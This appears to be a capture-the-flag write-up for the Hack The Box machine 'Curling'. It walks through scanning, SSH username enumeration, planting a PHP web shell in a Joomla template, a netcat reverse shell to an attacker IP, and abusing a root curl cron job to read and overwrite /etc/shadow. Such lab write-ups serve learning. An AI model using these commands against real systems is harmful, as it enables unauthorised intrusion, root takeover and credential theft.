# Writeup Curling

## Scan

```bash
$ export target="10.10.10.150"
$ nmap -T4 --max-retires 1 --max-scan-delay 20 --defeat-rst-ratelimit --open -oN nmap/quick.nmap -vv $target
$ nmap -T4 -p22,80 -sCV -oN nmap/ports.nmap -vv $target
```

## Enumeration

**Web Enumeration**

Joomla seems to be running on port 80 and we also find a file named `secret.txt`:
```bash
$ nikto -h $target -p 80 -w nikto.log
$ cmsmap -f J -F -v http://$target/ -o cmsmap.log
[-] Checking interesting directories/files ...
[L] http://10.10.10.150/secret.txt

Joomla 3.8.8
```

The content of `secret.txt` is `base64` encoded: `curl -s "http://$target/secret.txt" | base64 -d`.  

**SSH User Enumeration**

We use *OpenSSH 7.7 - Username Enumeration* and a custom wordlist to enumerate ssh users:
Let's use SecList's list and append some names from the page:  
```bash
$ echo -e "pebble\ncurl\nsheet\nfloris" >> usernames.txt
# OpenSSH 7.7 - Username Enumeration
$ v 45233.py
# replace _handler_table with _client_handler_table
:%s/_handler_table/_client_handler_table/g
$ chmod +x 45233.py && ./45233.py --userList usernames.txt --outputFile result.txt $target
$ cat result.txt
pebble is not a valid user!
curl is not a valid user!
sheet is not a valid user!
floris is a valid user!
```
Together with secret.txt this the login for joomla.  

## Exploitation

**Joomla to reverse shell**

Add `system($_GET["x"]);` to Extensions > Templates > Templates > Beez3 > jsstrings.php.  
Generate reverse shell code and connect back to attacker machine:
```bash
$ nc -nlvp 4444
$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.x.x LPORT=4444
# use burp repeater, encode url argument!
http://10.10.10.150/templates/beez3/jsstrings.php?x=mknod+/tmp/backpipe+p%3b+/bin/sh+0<+/tmp/backpipe+|+nc+10.10.14.20+4444+1>+/tmp/backpipe+HTTP/1.1
```
Upgrade to full tty shell:
```bash
# attacker
$ socat file:`tty`,raw,echo=0 tcp-listen:4444
# remote: download from attacker machine, cause cant resolve github..
$ cd /tmp && wget http://10.10.x.x:8000/socat
$ socat exec:'bash -li'ty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:4444
```

## Privilege Escalation

Find config files: `find /etc -name "*.conf" -exec ls -lad \{} \;`  
Find files writeable for us (dont include mount points): 
```bash
$ find / -xdev -perm -g+w -group $USER -type f -exec ls -lad \{} \; 2>/dev/null
-rw-rw---- 1 root floris 0 Mar 26 17:39 /home/floris/admin-area/report
-rw-rw---- 1 root floris 25 Mar 26 17:39 /home/floris/admin-area/input
```

With `pspy` we can see a job running regulary:
```
root     24678  0.0  0.1  57500  3312 ?        S    10:36   0:00 /usr/sbin/CRON -f
root     24679  0.0  0.0   4628   780 ?        Ss   10:36   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root     24680  0.0  0.4 105360  9092 ?        S    10:36   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```
It runs `curl -K input -o report` as root. We can control the config file of curl.  
Invoking curl on localhost, will serve `/var/www/html/index.php`.  
So we use joomla to change its content to: `<?php echo $_POST['profile'] ?>`
```bash
$ vim input
url = "http://127.0.0.1"
form = profile=</root/root.txt
$ cat report
<flag here>
```

**Be like the cool kids**

Read `/etc/shadow`. Generate your own root entry and overwrite the original.  
Use `su -` to test root. SSH with root wont work because of `PermitRootLogin no`!
```bash
$ v input
url = "http://127.0.0.1"
form = profile=</etc/shadow
$ mypass=$(openssl passwd -6 -salt 1337 hackthebox)
$ mypass=$(printf "root:%s:17673:0:99999:7:::" $mypass)
root:$6$1337$JsudCn3CkTagZThboj1Tq4oPY1LXAj9EW.SJX.YZIFwP7YBTA3sKy7qMHX4.WG3OlIBIa2xJhbFNjC6y6BqNA0:17673:0:99999:7:::
# replace first line in file
$ sed "1s/.*/$mypass" shadow

# write new shadow file
$ url = "file:///tmp/shadow"
$ output = /etc/shadow
$ su -
```

..or create symlink, so `-o report` will actually overwrite `/etc/shadow`.
```bash
$ echo 'url=file:///tmp/shadow' > input 
$ rm report 
$ ln -s /etc/shadow report
```

**Other useful stuff:**
* connect to sftp using curl: `curl sftp://$target/ -v --insecure --user floris:"<password>"`
* find word writeable files owned by root: `find / -uid 0 -perm u+w,g+w,o+w`

Rebuild environment with docker:
```bash
$ docker pull mysql:5.6.40 
$ docker pull joomla:3.8.8
# create joomla db, link db to joomla container
$ docker run -d --name joomla_db -e MYSQL_ROOT_PASSWORD mysql:5.6.40
$ docker run --name joomla_blog --link joomla_db:mysql -p 8080:80 -d joomla:3.8.8

# attach with console to running container
docker exec -it joomla_blog bash
```

**Reference:**

* https://github.com/DominicBreuker/pspy  
* https://www.exploit-db.com/exploits/45233  
* https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/  
* https://isc.sans.edu/forums/diary/Exploiting+the+Power+of+Curl/23934/  
